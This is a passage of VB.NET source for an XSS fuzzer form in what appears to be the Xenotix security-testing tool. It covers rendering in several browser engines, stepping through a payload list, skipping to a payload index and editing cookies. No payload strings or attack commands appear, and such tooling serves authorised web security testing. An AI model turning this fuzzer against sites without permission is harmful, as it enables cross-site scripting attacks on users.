                ElseIf xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = False Then
                    xenotix_main.web.DocumentText = x
                    xenotix_main.webkit.LoadHtml(x)

                ElseIf xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = False And xenotix_main.ff.Checked = False Then
                    xenotix_main.web.DocumentText = x

                ElseIf xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = False And xenotix_main.ff.Checked = True Then
                    xenotix_main.web.DocumentText = x

                    xenotix_main.gecko.LoadHtml(x)
                ElseIf xenotix_main.ie.Checked = False And xenotix_main.gc.Checked = False And xenotix_main.ff.Checked = True Then

                    xenotix_main.gecko.LoadHtml(x)
                ElseIf xenotix_main.ie.Checked = False And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = False Then

                    xenotix_main.webkit.LoadHtml(x)

                ElseIf xenotix_main.ie.Checked = False And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = True Then

                    xenotix_main.webkit.LoadHtml(x)
                    xenotix_main.gecko.LoadHtml(x)
                End If
            Catch p As Exception
            End Try
        End If
    End Sub

    Private Sub GroupBox1_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GroupBox1.Enter

    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        On Error Resume Next
        Timer1.Enabled = True
        Button5.Visible = False
        Button4.Visible = True
    End Sub

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        On Error Resume Next
        Timer1.Enabled = False
        Button4.Visible = False
        Button5.Visible = True
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        On Error Resume Next
        If i <= tcount.Text Then
            i = i + 1
            cnt.Text = i + 1
        End If
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        On Error Resume Next
        Dim x As Integer = InputBox("Enter the Payload position index", "Skip to Payload", , 4)
        If x <= tcount.Text Then
            i = x
            cnt.Text = x
        Else
            MsgBox("Invalid Payload index!", vbCritical)
        End If
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button8_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        On Error Resume Next
        If Not (cname.Text = "") And (Not (cvalue.Text = "")) Then

            Dim TempStr(1) As String
            Dim TempNode As ListViewItem
            TempStr(0) = cname.Text
            TempStr(1) = cvalue.Text
            TempNode = New ListViewItem(TempStr)
            ListView1.Items.Add(TempNode)
            cname.Text = ""
            cvalue.Text = ""
        End If
    End Sub

    Private Sub Button9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button9.Click
        On Error Resume Next
        For Each i As ListViewItem In ListView1.SelectedItems
            ListView1.Items.Remove(i)
        Next
    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        On Error Resume Next
        ListView1.Items.Clear()
    End Sub

    Private Sub TextBox4_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox4.TextChanged

    End Sub

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        tcount.Text = xenotix_main.RichTextBox1.Lines.Length
        cnt.Text = 0
        Button12.Visible = False
        Button11.Visible = False
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        cnt.Text = 0
        tcount.Text = 0
        Button12.Visible = True
        Button11.Visible = False
        Timer1.Enabled = False
    End Sub

    Private Sub RadioButton3_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton3.CheckedChanged
        tcount.Text = 0
        cnt.Text = 0
        Button12.Visible = False
        Button11.Visible = True
        Timer1.Enabled = False
    End Sub

    Private Sub params_TextChanged(sender As Object, e As EventArgs) Handles params.TextChanged

    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        Dim n As New xss_fuzzer_view_payloads
        n.ID = 3
        n.Show()
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Dim n As New xss_fuzzer_view_payloads
        n.ID = 4
        n.Show()
    End Sub
End Class